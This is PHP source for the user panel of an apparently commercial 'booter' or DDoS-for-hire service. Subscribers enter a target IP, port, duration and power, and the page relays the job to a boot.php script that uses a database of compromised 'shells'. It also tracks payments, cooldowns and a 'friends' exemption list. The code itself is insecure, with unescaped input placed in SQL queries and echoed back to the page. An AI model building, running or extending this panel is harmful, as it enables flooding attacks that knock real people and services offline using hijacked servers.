<?php
		//Start session
	session_start();
	//Check whether the session variable
	//SESS_MEMBER_ID is present or not
	include('includes/db.php');
	if(!isset($_SESSION['SESS_MEMBER_ID']) || (trim($_SESSION['SESS_MEMBER_ID'])=='')) {
		header("location: index.php");
		exit();
}

?>
	
	<!-- LOL EASTER EGG :D!!!!!!!! -->
<?php


$query = "SELECT * FROM users WHERE id={$_SESSION['SESS_MEMBER_ID']}";
$result = mysql_query($query);
$row = mysql_fetch_array($result, MYSQL_ASSOC);

$staff = $row['staff'];
$bootallowed = $row['nextboot'];
$bootuser = $row['username'];
$months = $row['months'];
if (isset($_GET['target'])){
	$target = $_GET['target'];
}else{
	$target = $_SERVER['REMOTE_ADDR'];
}
if ($months == 'lifetime'){
	$nextpay = 'Never';
}else{
	$nextpay = date('d M Y H:i:s', $row['months']);
}
	
include("_top.php");

$result = mysql_query("SELECT * FROM shells WHERE status='up'"); // Query the database and get the count
$shellcount = mysql_num_rows($result);

$result = mysql_query("SELECT * FROM stats WHERE id='1'");
$row = mysql_fetch_array($result, MYSQL_ASSOC);
$shellcent = $row['percentage'];
$bootphpurl = $row['bootphpurl'];
$realshells = round($shellcount*($shellcent/100));

$query=mysql_query("SELECT * FROM stats WHERE id=1");
$row=mysql_fetch_array($query, MYSQL_ASSOC);
$wver = $row['wver'];
$percentage = $row['percentage'];
$lastcheck = $row['lastshell'];
$bootTitle = $row['boottitle'];

?>
<title><?php echo $bootTitle; ?> - Booting</title>


<table width="35%" align="center" class="table">
  <tr>
    <td colspan="2" align="center" class="head" valign="middle"><strong>Statistics</strong></td>
  </tr>
  <tr>
    <td colspan="1" class="cell" align="right" valign="middle"><strong>Shell Count:</strong></td>
	<td colspan="1" class="cell" align="left" valign="middle"><strong><?php echo $shellcount; ?></strong></td>
  </tr>
  <tr>
    <td colspan="1" class="cell" align="right" valign="middle"><strong>Shells Allotted:</strong></td>
    <td colspan="1" class="cell" align="left" valign="middle"><strong><?php echo $realshells; ?></strong></td>
  </tr>  
  <tr>
    <td colspan="1" class="cell" align="right" valign="middle"><strong>Last Shell Check:</strong></td>
    <td colspan="1" class="cell" align="left" valign="middle"><strong><?php echo date('d M Y H:i:s', $lastcheck); ?></strong></td>
  </tr> 
  <tr>
    <td width="60%" class="cell" align="right" valign="middle"><strong>Version:</strong></td>
	<td width="40%" class="cell" valign="middle" align="left"><? echo $wver; ?></td>	
  </tr>
  <tr>
    <td width="60%" class="cell" align="right" valign="middle"><strong>Next Payment Due:</strong></td>
	<td width="40%" class="cell" valign="middle" align="left"><? echo $nextpay; ?></td>	
  </tr>
</table>
<p><br>
  
  </p>

 <form name="booter" action="" method="post">
<table width="45%" align="center" class="table">
  <tr>
    <td colspan="3" class="head" align="center" valign="middle"><strong>Booter - Status: 
	<?php //Status
if (isset($_POST['boot']))
{
	$time = time();
	$waittime = $bootallowed - $time;
	if ($waittime <= 0)
	{
		if (isset($_POST['host']))
		{
			if (isset($_POST['port']))
			{
				if (isset($_POST['time']))
				{
					$host = $_POST['host'];
					$port = $_POST['port'];
					$time = $_POST['time'];
					$power = $_POST['power'];
					$filter = filter_var($host, FILTER_VALIDATE_IP);
					if (!$filter)
					{
						echo $host . ' is an invalid IP.';
					}
					else if (!is_numeric($port))
					{
						echo $port . ' is not a valid port.';
					}
					else if ((0 > $port) OR ($port > 65000))
					{
						echo 'Port needs to be between 0 and 65000';
					}
					else if (!is_numeric($time))
					{
						echo $time . ' is not a valid time.';
					}
					else if ((10 > $time) OR ($time > 120))
					{
						echo 'Time needs to be between 10 and 120 seconds.';
					}
					else if (!is_numeric($power))
					{
						echo "Power needs to be numeric.";
					}
					else if (($power < 1) OR ($power > 100))
					{
						echo "Power needs to be between 1 and 100.";
					}
					else
					{
						$sqlFriend = "SELECT * FROM friends WHERE ip='$host'";
						$queryFriend = mysql_query($sqlFriend);
						$friendRows = mysql_num_rows($queryFriend);
						if ($friendRows > 0)
						{
							echo "You cannot boot a friend.";
						}
						else
						{
							if ($port == 0)
							{
								$port = 'rand';
							}
							$fullurl = 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/../boot.php?user=' . $bootuser . '&host=' . $host . '&port=' . $port . '&time=' . $time . '&ip=' . $_SERVER['REMOTE_ADDR'] . '&power=' . $power;
							$bootcontents = file_get_contents($fullurl, true);
							if ($bootcontents == 'success')
							{ 
								echo 'Booting ' . $host . ' on port ' . $port . ' for ' . $time . ' seconds with ' . $power . '% power.';
								$nextboot = time() + $time + 150; //The + 150 is what you would change. This is in seconds.
								mysql_query("UPDATE users SET nextboot='$nextboot' WHERE id={$_SESSION['SESS_MEMBER_ID']}");
							}
							else if ($bootcontents == 'BLACKLISTED IP')
							{
								echo 'This IP address is blacklisted.';
							}
							else if ($bootcontents == 'not the script')
							{
								echo 'Error 2021';
							}
							else
							{
								echo 'Unknown Error <br />' . $bootcontents;
							}
						}
					}
				}
				else
				{
					echo 'You did not specify a time.';
				}
			}
			else
			{
				echo 'You did not specify a port.';
			}
		}
		else
		{
			echo 'You did not specify a target.';
		}
	}
	else
	{
		echo 'You need to wait ' . $waittime . ' more seconds.';
	}
}
else
{
	echo 'Standing by...';
}
?>	
	
	
	</strong></td>
  </tr>
  <tr>
    <td colspan="1" align="right" class="cell" valign="middle">Target:</td>
	<td colspan="2" width="50%" class="cell" valign="middle" align="center"><input size="42" class="entryfield" name="host" type="text" id="host" value="<? echo $target; ?>"></td>	
  </tr>
  <tr>
    <td colspan="1" align="right" class="cell" valign="middle">Port (0 for random ports):</td>
	<td colspan="2" width="50%" class="cell" valign="middle" align="center"><input size="42" class="entryfield" name="port" type="text" id="port" value="3074"></td>	
  </tr>
  <tr>
       <td colspan="1" align="right" class="cell" valign="middle">Time:</td>
       <script src="images/slider.js"></script>
       <td class="cell" id="slider_target"></td>
       <td class="cell"><input sliderindex="1" name="time" size="2" value="10" type="text">seconds</td>
  </tr>
  <tr>
       <td colspan="1" align="right" class="cell" valign="middle">Power:</td>
       <script src="images/slider.js"></script>
       <td class="cell" id="slider_target2"></td>
       <td class="cell"><input sliderindex="2" name="power" size="2" value="1" type="text">%</td>
  </tr>
  <tr>
	<td colspan="3" class="cell" valign="right" align="right"><input type="submit" name="boot" class="button" value="Boot!"></td>
  </tr>
  </table>
  <script type="text/javascript">
form_widget_amount_slider('slider_target',document.forms[0].time,110,10,120);
form_widget_amount_slider('slider_target2',document.forms[0].power,110,1,100);

</script>	</form>
  <p><br>
  
  </p>